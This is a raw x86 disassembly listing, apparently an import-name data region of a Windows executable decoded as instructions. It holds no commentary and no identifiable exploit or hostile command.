  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
